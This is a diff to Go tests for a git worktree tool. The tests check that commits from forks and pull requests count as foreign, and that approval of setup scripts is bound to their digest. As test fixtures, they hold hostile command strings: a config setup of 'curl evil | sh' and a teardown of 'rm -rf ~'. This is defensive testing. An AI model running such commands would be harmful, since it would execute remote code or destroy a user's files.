@@ -266,17 +266,17 @@ func TestCreateRemoteBranchAndForeign(t *testing.T) {
 func TestForeignPullRequestPaths(t *testing.T) {
 	f := newFixture(t)
 	origin := f.remote("origin")
-	f.remote("fork")
+	fork := f.remote("fork")
 	identity := "file://" + origin
-	// A commit only the fork has.
-	f.git(f.repo, "checkout", "-q", "-b", "tmp")
-	f.write(f.repo, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
-	f.git(f.repo, "add", "flightdeck.json")
-	f.git(f.repo, "commit", "-q", "-m", "pr")
-	pr := f.git(f.repo, "rev-parse", "HEAD")
-	f.git(f.repo, "push", "-q", "fork", "tmp:patch")
-	f.git(f.repo, "checkout", "-q", "main")
-	f.git(f.repo, "branch", "-D", "tmp")
+	// A commit only the fork has, made in someone else's clone, so this repository's reflog
+	// never saw it committed.
+	other := filepath.Join(filepath.Dir(f.root), "other")
+	f.git(filepath.Dir(f.root), "clone", "-q", fork, other)
+	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
+	f.git(other, "add", "flightdeck.json")
+	f.git(other, "commit", "-q", "-m", "pr")
+	pr := f.git(other, "rev-parse", "HEAD")
+	f.git(other, "push", "-q", "origin", "HEAD:patch")
 	f.git(f.repo, "fetch", "-q", "--all")
 	own := f.git(f.repo, "rev-parse", "origin/main")
 
@@ -311,10 +311,45 @@ func TestForeignPullRequestPaths(t *testing.T) {
 	foreign("^{commit}", CreateOptions{Branch: "b3", Base: "fork/patch^{commit}"})
 	foreign("~0", CreateOptions{Branch: "b4", Base: "fork/patch~0"})
 
+	// Pull requests fetched into the project remote's own namespace, as GitHub documents
+	// (+refs/pull/*/head:refs/remotes/origin/pr/*): those refs are not the project's branches.
+	f.git(f.repo, "fetch", "-q", "fork", "patch:refs/remotes/origin/pr/7")
+	foreign("a commit id under origin/pr/*", CreateOptions{Branch: "b5", Base: pr})
+	f.git(f.repo, "fetch", "-q", "fork", "patch")
+	foreign("FETCH_HEAD under origin/pr/*", CreateOptions{Branch: "b6", Base: "FETCH_HEAD"})
+	foreign("~0 under origin/pr/*", CreateOptions{Branch: "b7", Base: "origin/pr/7~0"})
+
+	// The reflog rule: commits this repository made with git commit count as own; a commit
+	// stacked on a pull request does not, since its parent was fetched.
+	commit := func(branch, from, file string, amend bool) {
+		t.Helper()
+		f.git(f.repo, "checkout", "-q", "-b", branch, from)
+		f.write(f.repo, file, branch+"\n")
+		f.git(f.repo, "add", file)
+		f.git(f.repo, "commit", "-q", "-m", branch)
+		if amend {
+			f.write(f.repo, file, branch+" amended\n")
+			f.git(f.repo, "commit", "-q", "-a", "--amend", "-m", branch+" amended")
+		}
+		f.git(f.repo, "checkout", "-q", "main")
+	}
+	commit("mine", "origin/main", "mine.txt", false)
+	f.git(f.repo, "checkout", "-q", "mine")
+	f.write(f.repo, "mine2.txt", "two\n")
+	f.git(f.repo, "add", "mine2.txt")
+	f.git(f.repo, "commit", "-q", "-m", "second")
+	f.git(f.repo, "checkout", "-q", "main")
+	commit("amended", "origin/main", "am.txt", true)
+	commit("stacked", pr, "stack.txt", false)
+	foreign("a local commit on a pull request", CreateOptions{Branch: "stacked"})
+
 	for name, o := range map[string]CreateOptions{
 		"origin's commit by id": {Branch: "o1", Base: own},
 		"origin/main":           {Branch: "o2", Base: "origin/main"},
 		"HEAD on origin":        {Branch: "o3"},
+		"two unpushed commits":  {Branch: "mine"},
+		"an amended commit":     {Branch: "amended"},
+		"a base on local work":  {Branch: "o4", Base: "mine~1"},
 	} {
 		o.Remote = identity
 		c, err := f.create(o)
@@ -660,6 +695,12 @@ func TestMark(t *testing.T) {
 	got, ok, err := f.g.ReadMark(ctx, c.Worktree.Path)
 	if err != nil || !ok || got.Source != m.Source || !got.Approved || !got.Created.Equal(m.Created) {
 		t.Fatalf("mark %+v %v %v", got, ok, err)
+	}
+	// An approval covers exactly the scripts it was given.
+	cfg := Config{Setup: "make", Teardown: "make clean"}
+	ok2 := Mark{Approved: true, Digest: cfg.Digest()}
+	if !ok2.Allows(cfg) || ok2.Allows(Config{Setup: "make", Teardown: "rm -rf ~"}) || (Mark{Digest: cfg.Digest()}).Allows(cfg) {
+		t.Fatal("Allows does not bind the approval to the scripts")
 	}
 	// The mark is not in the working tree.
 	if dirty, _ := f.g.Dirty(ctx, c.Worktree.Path); dirty {
